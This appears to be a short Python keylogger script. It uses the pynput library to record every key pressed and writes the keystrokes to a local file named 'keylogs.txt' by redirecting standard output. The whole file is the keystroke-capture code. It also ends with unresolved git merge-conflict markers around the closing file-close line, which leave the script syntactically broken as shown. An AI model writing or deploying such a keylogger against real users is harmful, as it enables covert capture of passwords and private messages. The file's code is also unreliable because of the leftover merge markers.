from pynput import keyboard
import os
import sys

#redirect output from terminal to file
orig_stdout = sys.stdout
f = open('keylogs.txt', 'w')
sys.stdout = f

#log keys
def on_press(key):
    try:
        print('{}'.format(
            key.char))
    except AttributeError:
        print('{}'.format(
            key))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

sys.stdout = orig_stdout
<<<<<<< HEAD
f.close()

=======
f.close()
>>>>>>> edeb9b38263e20e5e48d5a6586a5e1a895a42ca5
